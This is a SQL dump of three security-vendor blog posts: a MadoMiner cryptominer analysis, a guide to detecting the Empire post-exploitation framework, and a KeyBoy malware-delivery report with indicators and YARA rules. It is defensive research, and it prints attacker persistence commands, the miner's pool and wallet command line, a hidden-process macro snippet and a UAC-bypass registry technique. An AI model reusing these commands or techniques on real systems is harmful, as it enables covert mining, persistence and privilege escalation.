INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1, 'MadoMiner Part 2 - Mask', 'James Quinn', 'October 29, 2018 ', 'This is a guest post by independent security researcher James Quinn.      If you have not yet read the first part of the MadoMiner analysis, please do so now.  This analysis will pick up where Part 1 left off, while also including  a brief correction.  The x64 version of the Install module was listed as identical to the x86 Install module.  However, this is not correct.  The x64 Install module is identical in run-through to the 360Safe.exe module, which will be discussed later in this analysis.In addition, take care with this portion of the malware.  The batch script for Mask.exe, DemC.bat, appears to run if it detects any copies of itself during runtime, or if you run the x64 version of install on a 32 bit machine.Where Install.exe was in charge of infecting new victims with MadoMiner, it seems Mask.exe is where the real payoff lies.  Mask.exe utilizes XMRig miners in order to mine for XMR which it then sells for profit.  While madominer was earning $6,000 a month as of the last analysis,Around 10/14, MineXMR closed the old address due to botnet reports.  A new address has been identified at 47QrUBQ4ejMW5wrWXiKUyRcQCZszauGWg9c3SLkzFoBJi45M5yN6gVPjVxSUfjMq4u8vepEejdnxyRQcv4RuFGy25x67433, mining through minexmr.com again.  Currently, the hashrate is at 109Kh/s, and steadily rising.Also, around the time that the address changed, MadoMiner also became drastically different.Malware AnalysisWhere Install.exe only downloaded 1 file from a remote host, Mask.exe downloads two files.  In addition, the servers used to download the files are also different than Install.exe, increasing the proposed size of the botnet.DomainsIn addition to the 2 domains identified in part 1, a new domain has also been identified for a distribution server:http://d.honker[dot]infoHowever, the domain is currently dead.  In addition, the mining server currently used is pool.minexmr[dot]comA C2 server(newly updated version):http://qq.honker[dot]infoPreviously identified distribution domains:http://da[dot]alibuf.com:3/http://bmw[dot]hobuff.info:3/Previously Identified IPs:61.130.31.174Previously identified mining servers:http://gle[dot]freebuf.infohttp://etc[dot]freebuf.infohttp://xmr[dot]freebuf.infohttp://xt[dot]freebuf.infohttp://boy[dot]freebuf.infohttp://liang[dot]alibuf.comhttp://dns[dot]alibuf.comhttp://x[dot]alibuf.comIn addition, http://da[dot]alibuf.com:3, the main distribution server, seems to have been registered by bodfeo[at]hotmail.com in early October 2017. According to an analysis by Steve Butt of DomainTools, this email was linked to APT19/c0d0s0, however it was most likely due to domain reselling.ExploitsDuring the execution of sogou.exe, the following exploits are used to install on new victims’ PCs:CVE-2017-9073, RDP vulnerability on Windows XP and Windows Server 2003CVE-2017-0143, SMB exploitCVE-2017-0146, SMB exploitInstallationMask.exe ends up on a victim’s computer after either x86.dll or x64.dll downloads mado.exe or dst.exe, respectively.  However, unlike with Install.exe, it doesn’t matter which file is downloaded because they are the same files (They have the same file hash).SetupOnce Mask.exe is on a victim’s computer, it attempts to connect to one of the distribution servers identified above (bmw[dot]hobuff.info).  Once a connection is established, it attempts to download two files, sogou.exe and 360safe.exe.  Sogou.exe is the payload that contains the CPUInfo scanner, however, it has been set to scan for IPV6 addresses.  Sogou is saved as Conhost.exe in C:\\Windows\\Installer.  360Safe.exe is the payload that contains the XMRig miners as well as the service manager (NSSM).  360Safe is saved as Makes.exeMask.exe Mask.exe seems to be the profitable part of MadoMiner.  Because of this, there are a lot more anti-debug tricks used during Mask.exe’s runthrough.  Mask.exe seems to be in charge of downloading/executing Sogou.exe and 360Safe.exe.  Each of the modules also have batch scripts that will be discussed in the analysis that are run during different stages of the execution. MadoMiner generates money by mining for XMR using Mask.exe, 360Safe.exe, and XMRig.  Mask.exe installs 360Safe.exe which in turn installs XMRig.  MadoMiner uses the service manager NSSM in order to install the necessary services for runtime and persistence.  In addition, in Sogou.exe, MadoMiner appears to search for IPV6 addresses that are vulnerable to EternalBlue, as well as installs some tasks.If Mask.exe detects another copy of itself, demC.Bat is run (see removal section for information).  DemC.Bat is just like the DemC in Part 1, where it attempts to delete the malware from as an attempt at anti-debugging.  It also seems to close any open ports so that you can’t be reinfected --- how thoughtful!Sogou.exe runtime analysisSogou.exe appears to be another propagation module for MadoMiner, which answers the question of “Since x64.dll installed a miner during Install.exe, how did the x64 version of the malware propagate?” Sogou.exe, once downloaded by Mask.exe, saves itself to C:\\%Windows%\\Installer\\conhost.exe, and then executes. However, Sogou.exe is more of a dropper than the full malware itself.  Sogou.exe drops FileFtp.exe into C:\\Program Files\\Windowsd.  FileFtp.exe appears to be a partially encrypted propagation module that uses the same exploits as ZombieBoyTools, which it drops into \\Windowsd. However, this propagation module has a bit more in the way of hiding.  Just like in all other modules of MadoMiner, FileFtp includes a script to delete itself from the filesystem.  However, as any forensic investigator can tell you, when a file is deleted, it isn’t really gone, at least not immediately.  However, with FileFtp.exe, prior to deleting itself after installing the propagation exploits and the executable used to spread, runs cmd /c cipher /w:C , which begins overwriting unallocated space, where deleted files are stored.  Not only does FileFTP.exe delete itself, it also wipes itself from the system entirely.Tasks and batch scripts used by Sogou.exeAutoKMSK is used by sogou.exe to execute a copy of itself saved as C:\\Windows\\Installer\\conhost.exe every 15 minute.  It does this by using the commandschtasks /create /sc minute /mo 15 /tn “AutoKMSK” /tr “C:\\windows\\Installer\\conhost.exe” /ru “system” /fAutoKMSKK is used by sogou.exe to execute a script known as “free.bat”, which is very similar to Install.exe’s free.bat.  However, this script will essentially delete all files installed by conhost.exe every 26 mins.  This is used by the malware in order to evade detection. The command for this is as followsschtasks /create /sc minute /mo 26 /tn “AutoKMSKK” /tr “C:\\Windows\\Installer\\free.bat” /ru “system” /fMask.exe’s Free.bat360Safe.exe Brief OverviewWhere Sogou.exe appears to be a propagation module, 360Safe.exe is a pure mining module.  360Safe.exe begins on a computer after having been downloaded from bmw.hobuff[dot]info and executed by Mask.exe.  As the main mining payload for MadoMiner, 360Safe is in charge of installing the service manager used by MadoMiner, and then dropping and installing the miner.  However, 360Safe does this in a fairly modular and interesting way, because not only does 360Safe consist of both the x86 and x64 versions of the service manager used and the miner used, but it also identifies the architecture of the host PC and then dynamically creates a payload based on the architecture identified.  In addition, 360Safe uses a number of anti-vm techniques, such as changing the base language of the files used by the service manager and using complete information when setting up registry keys (such as official looking descriptions and error messages upon tampering with malware).360Safe Service Manager360Safe uses NSSM as its service manager (Non-Sucking Service Manager).  NSSM allows it to quickly and easily install services to the system using simple commands like NSSM install <service name> <path-to-service>.  However, 360Safe uses some techniques to hide the fact that it is NSSM.  First, 360Safe changes the base language of the installation information for NSSM.  The information is changed to the Host’s language during runtime using the MessageBoxEx Windows API command.  However, the result of this is that the strings are semi-unreadable when a basic string analysis is performed.NSSM strings informationIn addition, once the architecture has been identified and the NSSM installer selected, a different installation location is used.  In 360Safe’s use of NSSM, it installs the service manager to the directory C:\\%Windows%\\Fonts as “svchost.exe”, with the registry keys “HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\NSSM”\\NSSM values “EventMessageFile = C:\\Windows\\Fonts\\svchost.exe” “TypesSupported = 0x00000007”All of these can be used as IOCs.In addition, any windows opened by NSSM are hidden so that the host doesn’t suspect anything.  Anytime that 360Safe needs to install a service, it calls “C:\\windows\\Fonts\\svchost.exe” in order to do so.NSSM Registry Installation360Safe Miner InstallationJust like the rest of 360Safe, the mining portion also installs all of its executables to C:\\%Windows%\\Fonts.  However, it doesn’t use just one executable to install the miners.  First, 360Safe.exe drops Conhost.exe into C:\\%Windows%\\Fonts.  In addition to dropping conhost into C:\\%Windows%\\Fonts, a new service is created called ServiceMaims, which serves for persistence for Conhost. The Display Name (EG: the Name that shows on Task manager) for ServiceMaims is “Network Location Service”, and the Description is “Provides performance library information from Windows Management”.ServiceMaims is then started which in turn starts Conhost.Registry Keys:“HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMaims”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMaims\\Parameters”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMaims\\Parameters\\AppExit”Values in \\ServiceMaims\\“DisplayName = ServiceMaims”“ErrorControl = 0x00000001”“ImagePath = C:\\windows\\Fonts\\svchost.exe”“ObjectName = LocalSystem”“PreshutdownTimeout = 0x0002bf20”“Start = 0x00000002”“Type = 0x00000010”Values in \\ServiceMaims\\Parameters\\:“AppDirectory: C:\\windows\\Fonts”“Application: C:\\windows\\Fonts\\conhost.exe”“AppParameters: “Values in \\ServiceMaims\\Parameters\\AppExit\\:“(Default): Restart”360Safe ConhostConhost.exe in C:\\%Windows%\\Fonts is used as a backup/dropper for the miner that will be installed.  Conhost consists of the x86 version of XMRig, the x64 version of XMRig, and a dropper.  The dropper has some installation scripts that are used for persistence, and also drops only one version of the miner, either x86 or x64 depending on your OS.On first runtime, conhost enumerates the victim’s OS architecture and then creates a file in C:\\%Windows%\\Fonts, called “rundllhost.exe”, where it saves either the x86 miner or the x64 miner, depending on your OS.  It then runs a script to save the miner as a Service, as well as save the mining information into registry so that it can be passed to the miner during execution.The DisplayName = “WMI Performance Services” The Description = “Identify Computers that are connected to the network, collect and store the properties of these networks, and notify the application when they are changed”The script then runs ServiceMais so that the miner can be executed.Note:  This miner only mines at 50% power, but was giving the authors over $6,000 a month before minexmr shut down the address.  The new address is earning around $2,000 a month, and has only been active for a few days, however I’ll get more into that below.Registry Keys:“HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMais”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMais\\Parameters”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMais\\Parameters\\AppExit”Values in \\ServiceMais\\:“DisplayName = ServiceMais”“ErrorControl = 0x00000001”“ImagePath = C:\\windows\\Fonts\\svchost.exe”“ObjectName = LocalSystem”“PreshutdownTimeout = 0x0002bf20”“Start = 0x00000002”“Type = 0x00000010”Values in \\ServiceMais\\Parameters\\:“AppDirectory: ““Application = rundllhost.exe”“AppParameters = -o pool.minexmr.com:443 -u 45WVNRZkKoR55thZWviZ3diXBLAcNRp4yFCtDCnCLRL7bq9E7XqQ7GX5auuc8thCvgUv1av6MpgC5gFVECYGHmx1VKkfEnp -p x -k --donate-level=1 --max-cpu-usage = 50Mask.exe RemovalDisclaimer regarding updated malware:  While MadoMiner did update itself around 10/14-10/16, 2018, it doesn’t look like it can update the current bots that are already deployed, only new ones.  For this reason, while IOCs regarding the new malware will be listed at the bottom, a removal section for the old malware will still be included.  Just keep in mind that if your infection occurs after 10/16/2018, the file names listed in this guide may not be entirely accurate. Warning Regarding Batch ScriptsBefore attempting to remove this malware, the batch files should be brought up and treated with care.  Make sure that all of your files are backed up.  This malware deletes files and then wipes unallocated space, so file recovery is incredibly difficult.DemC is mainly used by the malware to disable analysis attempts.  If another copy of it is detected, or if you try to run the 64bit version of Install.exe on a 32 bit system, it scans your system for several different files and folders used in multiple different malware campaigns and makes them inaccessible.  It also closes any open ports that are vulnerable to its campaigns.  It also changes the Image File Execution Options, making it impossible to run the malware again.Removal Steps - Sogou.exeSogou.exe installs 2 tasks during installation, which will need to be stopped, favorably before the free.bat task is allowed to run.  The tasks, known as “AutoKMSK” and “AutoKKMSK”, can be located by opening the Windows tool “Task Scheduler”.  These tasks will need to be stopped and deleted, however, note what files are executed by the tasks in the “Actions” tab of the task description.  In this case, it would be “C:\\%Windows%\\Installer\\conhost.exe” and “C:\\%Windows%\\Installer\\free.bat”In C:\\%Windows%\\, you’ll want to locate a folder known as “Installer”.  For Sogou.exe, this is the main installation folder.  Inside Installer, you’ll want to locate both “Conhost.exe” and “free.bat”.  Delete them. In C:\\Program Files\\, you’ll want to locate a folder known as “Windowsd”.  This is where Sogou.exe installs FileFTP.exe and all subsequent files dropped by FileFTP.exe.  If the file deletion script hasn’t already come through and removed them, you’ll want to remove this entire folder.  Note:  Windowsd may or may not contain over 70 different files for propagation to other systems.Removal Steps - 360Safe.exe360Safe.exe appears to install more files into registry than Sogou.exe.  First, as 360Safe.exe installs several services, those will need to be stopped using the Service manager, and then deleted from registry.Service Name: EventlogRegkey: HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Image Location: C:\\%windows%\\Fonts\\svchost.exeService Name: ServiceMaimsRegkey: HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMaimsImage Location: C:\\%windows%\\Fonts\\conhost.exeService Name: ServiceMaisRegkey: HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMaisImage Location: C:\\%windows%\\Fonts\\rundllhost.exe360Safe saves itself to C:\\%Windows%\\ as makes.exe, which will need to be deleted as well. Removal Steps - Install.exe (x64)As the x64 version is a near identical miner to the x86 and x64 versions of mask.exe, the only things that have changed are the services installed.  Removal steps are below however (order is respective.  RpcEptManger = ServiceMaims, and Samserver = ServiceMais)Service Name: EventlogRegkey: HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Image Location: C:\\%windows%\\Fonts\\svchost.exeService Name = RpcEptMangerRegKey = SYSTEM/CurrentControlSet/Services/RpcEptManger/Image Location = C:\\%WindowsDirectory%\\Fonts\\wininit.exeService Name = SamserverRegKey = SYSTEM/CurrentControlSet/Services/Samserver/Image Location = C:\\%WindowsDirectory%\\Fonts\\rundllhost.exeRemoval - DemC Has Been RunIn the case that DemC is run, removal becomes more complex.  DemC’s purpose is to hide MadoMiner from analysis and thus makes directories/takes ownership of current directories in order to hide.SpecificallyRemoves the %Windows%\\SpeechsTracing directory (if it exists)Removes the %Windows%\\SecureBootThemes directory (If It exists)Removes the %Windows%\\sysprepthemes directory (if it exists)Makes a new directory at %Windows%\\SpeechsTracing\\Microsoft and then proceeds to make that directory inaccessible for everyoneMakes a new directory at %Windows%\\SecureBootThemes and then proceeds to make that directory inaccessible for everyone.Makes a new directory at %Windows%\\sysprepthemes and then proceeds to make that directory inaccessible for everyoneMakes the file C:\\ProgramData\\Natihial\\svshostr.exe inaccessible for everyoneMakes the file C:\\ProgramData\\new\\csrss inaccessible for everyoneMakes the file C:\\ProgramData\\Microsoft\\Natihial\\cmd.exe inaccessible for everyoneMakes the file C:\\ProgramData\\expl0rer.exe inaccessible for everyoneMakes the file C:\\windows\\svchost.exe inaccessible for everyoneMakes the directory C:\\%windows%\\svchost.exe and then proceeds to make that directory inaccessible for everyoneMakes the directory C:\\%windows%\\tasksche.exe and then proceeds to make that directory inaccessible for everyoneMakes the directory C:\\program files (x86)\\stormii\\server.exe and then proceeds to make that directory inaccessible for everyoneFor the files made inaccessible, you’ll need to take ownership of them, either by using the built in security manager GUI, or by using the sysinternals suite TakeOwn.Indicators of CompromiseSamplesMd5SizeIPIOCMask.exe4ae31911c1ef2ca4eded1fdbaa2c7a49741.4 KBbmw.hobuff[dot]info:3/C:\\%Windows%\\tem.vbsC:\\%Windows%\\demc.bat360Safe.exece606d80b44ea2aae81056b9088ba1e43.6 MBpool.minexmr[dot]com:443Services:EventLogServiceMaimsServiceMais Regkeys:   +HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\ +  HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMaims + HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMais\\ Executables: + C:\\%windows%\\Fonts\\svchost.exe + C:\\%windows%\\Fonts\\conhost.exe + C:\\%windows%\\Fonts\\rundllhost.exe Connection to pool.minexmr.com:443 Scripts:C:\\%Windows%\\tem.vbs360Safe_svchost_x86.exe0a7d7ed55c4202f5106824f11ecb22fa299 KB-Regkeys:   +HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\ Executables: + C:\\%windows%\\Fonts\\svchost.exe 360Safe_svchost_x64.exe081f10718d76c9b3b19901f0ee630960292KB-ServicesEventLog Regkeys:   +HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\ Executables: + C:\\%windows%\\Fonts\\svchost.exe 360Safe_conhost.exe9c59ea0f58c5143b0860ec434d6467802.3 MB-ServicesServiceMaims Regkeys:+  HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMaims Executables:+ C:\\%windows%\\Fonts\\conhost.exe 360Safe_rundllhost_x86.exe467d7dfe3a1fe82d12b38d997df5cfbe1.6 MBpool.minexmr[dot]com:443Services:ServiceMais Regkeys: + HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMais\\  Executables: + C:\\%windows%\\Fonts\\rundllhost.exe Connection to pool.minexmr.com:443 360Safe_rundllhost_x64.exee41f5e79400c985e8d8a25f0711095f15302e8dd481 KBpool.minexmr[dot]com:443/Regkeys: + HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMais\\  Executables: + C:\\%windows%\\Fonts\\rundllhost.exe Connection to pool.minexmr.com:443Sogou.exeedfa66accd958eb87a6e8ef1eb708d2f3.9 MB-Folder:C:\\%Program Files%\\Windowsd Tasks:AutoKMSKAutoKKMSK Executables:C:\\%Windows%\\Installer\\conhost.exe C:\\%Windows%\\Windowsd\\FileFtp.exe Assorted executables needed for spreading found in \\Windowsd Scripts:C:\\%Windows%\\free.batFileFtp.exe1188f935979806545cbf118e22416be58.9 MB-C:\\%Windows%\\Windowsd\\FileFtp.exe Assorted executables needed for spreading found in \\Windowsd Installx64.exed8470f5c12f5a5fee89de4d4c425d6141.3 MBx.alibuff[dot]comServices:EventLogRpcEptMangerSamserver RegKey:HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\RpcEptManger\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\Samserver\\ Executables: C:\\%windows%\\Fonts\\svchost.exeC:\\%WindowsDirectory%\\Fonts\\wininit.exeC:\\%WindowsDirectory%\\Fonts\\rundllhost.exeInstallx64_svchost.exe081f10718d76c9b3b19901f0ee630960299 KB-Services:EventLog RegKey:HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\ Executables:C:\\%windows%\\Fonts\\svchost.exe Installx64_wininit.exe081f10718d76c9b3b19901f0ee630960490 KB-Services:RpcEptManger RegKey:HKLM\\SYSTEM\\CurrentControlSet\\Services\\RpcEptManger\\  Executables:C:\\%WindowsDirectory%\\Fonts\\wininit.exeInstallx64_rundllhost.exee41f5e79400c985e8d8a25f0711095f15302e8dd481 KBx.alibuff[dot]comServices:Samserver RegKey:HKLM\\SYSTEM\\CurrentControlSet\\Services\\Samserver\\ Executables:C:\\%WindowsDirectory%\\Fonts\\rundllhost.exeMadoMiner_New_445.exed4d8f87c61051c28ca3cee7e38bf839d2.1 MBa.f2pool[dot]info:13531Task named “GooglePingInCongifs” executing C:\\windows\\lsass.exeC:\\%WindowsDirectory%\\Install.exeC:\\%WindowsDirectory%\\lsass.batMining at a.f2pool[dot]infoMadoMiner_New_445_Lsass.exe1dd1550f2586411766cba953badf76f74.5 MBa.f2pool[dot]info:13531C:\\%WindowsDirectory%\\lsass.exe MadoMiner_New_Dst.exe4ace52693bdeace5b285d35e47be6cfc102.4 kbqq.honker[dot]infoService:Jklmno Regkey:HKLM\\SYSTEM\\CurrentControlSet\\Services\\Jklmno Executable:C:\\%Windows%\\svchost.exeMadoMiner_New_Dst_DecryptedRAT.exe01374ea3c48b69876d9375a2baba76ce51.6 kbqq.honker[dot]infoService:Jklmno Regkey:HKLM\\SYSTEM\\CurrentControlSet\\Services\\Jklmno Executable:C:\\%Windows%\\svchost.exedsMadoMiner_New_Mask.exe345239f58ddfd522ff04ad67009d15e94.5 MBl.f2pool[dot]info:443/C:\\%WindowsDirectory%\\Fonts\\lsass.exeC:\\%WindowsDirectory%\\Fonts\\svchost.exeC:\\%WindowsDirectory%\\Fonts\\runhost.exe MadoMiner_New_Mask_lsass.exe0ef0a7198444a43be51948e10cc15c533.5 MBl.f2pool[dot]info:443/C:\\%WindowsDirectory%\\Fonts\\lsass.exeMadoMiner_New_Mask_svchost.exe8a44626c2ca26a84764e7ad771143d4489.1 kb-C:\\%WindowsDirectory%\\Fonts\\svchost.exe', 'malwaremalware researchmadominer', '/blogs/labs-research/madominer-part-2-mask');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (2, 'Detecting Empire with USM Anywhere', 'Jose Manuel Martin', 'October 18, 2018 ', 'Empire is an open source post-exploitation framework that acts as a capable backdoor on infected systems.  It provides a management platform for infected machines. Empire can deploy PowerShell and Python agents to infect both Windows and Linux systems.Empire can:Deploy fileless agents to perform command and control.Exploit vulnerabilities to escalate privileges.Install itself for persistence.Steal user credentials.It has also evolved to support the initial attack phases of an attack, and can create malicious documents to deploy its agent.Empire’s features are classified into listeners, stagers and modules. Below, we describe how AlienVault USM can detect these stages below on a Windows target.StagingEmpire first attempts to deploy an agent using one of multiple stager modules. USM will generically detect the agent after Powershell is invoked with an encoded payload. Commands executed with encoded arguments are commonly used by attackers as an obfuscation technique, so they produce the USM alert ‘Defense Evasion - Obfuscated Command - Powershell Execution of Encoded Command’:This alert detects most Empire stagers on Windows, when they use Powershell to execute an encoded command.If enabled, the Windows Antimalware Scan Interface should also block the PowerShell command.  The ‘Malware Infection - Windows Defender Malware Detected’ alert, shows the necessary information to locate the malicious file:An alternative for an attacker is to craft an Office document with a macro, which will execute the agent command by running a crafted Windows process from the WMI Service:Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")Set objConfig = objStartup.SpawnInstance_objConfig.ShowWindow = 0Set objProcess = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\")objProcess.Create str, Null, objConfig, intProcessIDWhen the macro runs, the Windows Management Instrumentation Command will create a new process. USM will listen the Windows events to detect the WMIC call, commonly used in lateral movement scenarios. The ‘Lateral Movement - Remote WMIC Activity’ alert will raise displaying the malicious Powershell command:Another way for an attacker to implant the Empire agent into their victims machine is to create a HTML Application using the Empire module windows/hta. In weak security configuration system, a simple spear phishing mail with a link to the crafted HTML application will be enough to get the agent running.For each alert, the USM provides detailed information about the nature of the issue and useful recommendations for the security staff to follow:As this is a common technique for installing malware, USM identifies applications such as Powershell executed by HTML Applications. In this instance, USM creates an alarm for ‘Code Execution - Suspicious Process Created by mshta.exe’:Escalating PrivilegesAfter infection, the attacker will try to escalate privileges. For that, they can use one of the ‘privesc’ Empire modules.One of the most dangerous will try to bypass Windows UAC by abusing the native Event Viewer. When Event Viewer runs, it tries to execute mmc.exe from  HKCU\\Software\\Classes\\mscfile\\shell\\open\\command registry. Thus, an attacker can use that location to place a process that will run with high level integrity.Trying this would result in a registry key hijack attempt, that is detected by AlienVault agent and deployed in USM with a ‘Privilege Escalation - Windows UAC Bypass’ alert:Empire C&C\nThe Empire agent will access the network through a crafted powershell command. Although this command combines a number of obfuscation techniques (such as case switching) and Base64 encoding, some features in its structure are invariant and allow for detection.When the decoded command is registered by ‘Windows Powershell Login Channel’ and sent to the USM engine, it will trigger a ‘Hacking Tool - Powershell Empire agent CnC activity’ alert announcing that Empire has been detected on the machine:Other featuresThe Empire framework also provides several modules to enable persistence on the infected machine such as: scheduled tasks, a number of registry keys, or WMI event subscriptions.USM Anywhere alerts of each scheduled task with a low priority alarm:These alerts provide full information about the task content, responsible user, and other key data.To steal system credentials, an attacker can also rely on Empire modules. The mimikatz module can operate after a high privileges agent is installed in the victim’s machine. Executing mimikatz leverages an iterative file listing process easy to detect with USM:The alert  ‘Credential Access - Powershell script executing mimikatz’ deploys the command and other interesting data.Empire also uses registry keys for persistence. Some interesting registries to monitor with USM are SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run and SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug.Thanks Chris Doman for collaborationAppendixHost detectionEmpire is detected as it is installed and executed on a machine with the following detections:Malware Infection - Windows Defender Malware DetectedDefense Evasion - Obfuscated Command - Powershell Execution of Encoded CommandCode Execution - Suspicious Process Created by mshta.exePrivilege Escalation - Windows UAC BypassHacking Tool - Powershell Empire agent CnC ActivityCredential Access - Powershell script executing mimikatzSecurity Critical Event - Windows Scheduled Job CreatedNetwork detectionEmpire is detected as it communicates over the network via the following network detections:ETPRO TROJAN Observed PS Empire Downloader SSL Cert via MalDoc Oct 20ETPRO TROJAN PowerShell Empire Request HTTP PatternETPRO TROJAN PowerShell Empire Response HTTP PatternETPRO TROJAN PowerShell Empire Malicious SSL Certificate DetectedETPRO TROJAN PowerShell Empire SSL CertETPRO TROJAN Receiving Possible PowerShell Empire StagerETPRO CURRENT_EVENTS PowerShell Empire Session via MSOffice Doc MacroETPRO CURRENT_EVENTS PowerShell Empire Session Initial ActivityETPRO CURRENT_EVENTS PowerShell Empire Session via Excel Macro', 'malwareusm anywhereempire', '/blogs/labs-research/detecting-empire-with-usm-anywhere');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (3, 'Delivery (Key)Boy', 'Chris Doman', 'October 8, 2018 ', 'IntroductionBelow we’ve outlined the delivery phase of some recent attacks by KeyBoy, a group of attackers believed to operate out of China. They were first identified in 2013 targeting governments and NGOs in South East Asia. Their primary targeting continues to this day, though they have also been known to target more diverse victims such as the energy sector.Malware Delivery through Open Source Exploit KitsKeyBoy sent the following email to India\'s Ambassador to Ethiopia from an email address at nic[.]in, India\'s National Informatics Centre.The file f43f60b62002d0700ccbcbd9334520b6The attached malicious document downloads and executes a script that installs the final payload:This script contains text (eg; “<component id=\'giffile\'>” ) which matches a pre-packed version of the popular CVE-2017-0199 exploit available on GitHub.We’ve seen other malicious documents where KeyBoy have tested another exploit generator. In that case KeyBoy didn’t change the default settings so the document meta-data provides some obvious hints that the document is malicious:Delivered MalwareThe next stage in these attacks is typically a malware family known as TSSL. This malware originally identified by PwC and more recently described by Trend Micro and CitizenLab.Most samples are built on the attackers machine from the location:D:\\Work\\...Though the build path of a recent sample seems to indicate the attackers are having problems bypassing Symantec antivirus, and is built from:C:\\Users\\CN_ide\\Desktop\\TSSL_v3.2.7_BypassSymantec_20180528\\TClient\\Release\\FakeRun.pdbDelivering Android MalwareWe’ve also noted continued infections of the Titan Android malware associated with Keyboy, originally identified by LookOut. The source of the files that we have managed to identify is old - and seems to date back to a user named Textplus0012 posting malicious APK files on a Taiwanese site (apk.tw) for downloading Android applications:The user textplus0012 on apk.twThis user stopped posting the malicious files in 2015. It is unclear where samples of Titan were delivered from after this.DetectionAlienVault Agent DetectionsThe AlienVault Agent is a lightweight, adaptable endpoint agent based on osquery and maintained by AlienVault.The AlienVault Agent detects the following malicious activity during the attacks:Suspicious Process Created by Microsoft Office ApplicationPowershell Process Created by Scripting ExecutableSuspicious PowerShell ArgumentsPowerShell process with suspicious arguments and network activityNetwork DetectionETPRO INFO DYNAMIC_DNS Query to a *.dynamic-dns.net DomainAppendixA concise set of indicators are included below, a fuller list is available in the OTX Pulse.  File-Hashes91dfd19376574039bc80f3af5de341dd8927993ceb5dbb269c375c150a2c3e20831c3c40cc3fbc28b1ce1eca6bf278602c088f0580d6bdf324ef949c7d48a707c6c3678d8e6f715eda700eec776f75d1b733cab9757813cff4e206581ed8349ff83562853dc530a609ed866b375ac725599d7a927281e9d6f2e46f481e3eb292Fdb85d3f08eb70f0d2171d8bd348574139f63f31a788d2ff1b2a28aca6066345bf5ee65c6f9523923f6da2eead2a01698857d5fecae661a109b81409c18c0b6b7bf4fd019411075a5d98cf966516af3ddb7b007c1b9146c264ce2e4a1572e5e8 Domains from recent campaignsmuonline.dns04[.]commicroword.itemdb[.]comoffice.otzo[.]commoffice.mrface[.]comofflce.dnset[.]commicrosoftofice.zyns[.]comonline.ezua[.]commutecider[.]com - See report by ClearSkySecalibabacloud.zzux[.]comalibabacloud.wikaba[.]comalibabacloud.dynamic-dns[.]netbookmarklies[.]commanager-goog1e[.]comhellomyanmar[.]info URLshttp://moffice.mrface[.]com/office.scthttp://offlce.dnset[.]com/office.sct Yara Rulesrule keyboy_mobile_titan\n\n{\n\n    meta:\n\n       author = \"AlienVault Labs\"\n\n       copyright = \"Alienvault Inc. 2018\"\n\n       license = \"Apache License, Version 2.0\"\n\n       sha256 = \"5acc64f814cc06db5e5cc56784607ddfa95e3e45170002a210c807857d48a1b0\"\n\n       strings:\n\n              $string_1 = \"titans.action.GLOBAL_ACTION\"\n\n              $string_2 = \"titans.action.LOCATION_ACTION\"\n\n              $string_3 = \"titans.action.PHONE_RECORD_ACTION\"\n\n       condition:\n\n        all of them\n\n}\n\n\nrule keyboy_document_ppsx_sct\n\n{\n\n    meta:\n\n       author = \"AlienVault Labs\"\n\n       copyright = \"Alienvault Inc. 2018\"\n\n       license = \"Apache License, Version 2.0\"\n\n       description = \"Matches on compressed sub-file\"\n\n       sha256 = \"831c3c40cc3fbc28b1ce1eca6bf278602c088f0580d6bdf324ef949c7d48a707\"\n\n       strings:\n\n              $string_1 = \"<vt:lpstr>script:http://\"\n\n              $string_2 = \".sct\\\" TargetMode=\\\"External\\\"/></Relationships>\"\n\n       condition:\n\n        any of them\n\n}Additional Yara rules are available from Citizen Lab and Florian Roth.', 'malwaremalware researchmalware deliverykeyboy', '/blogs/labs-research/delivery-keyboy');
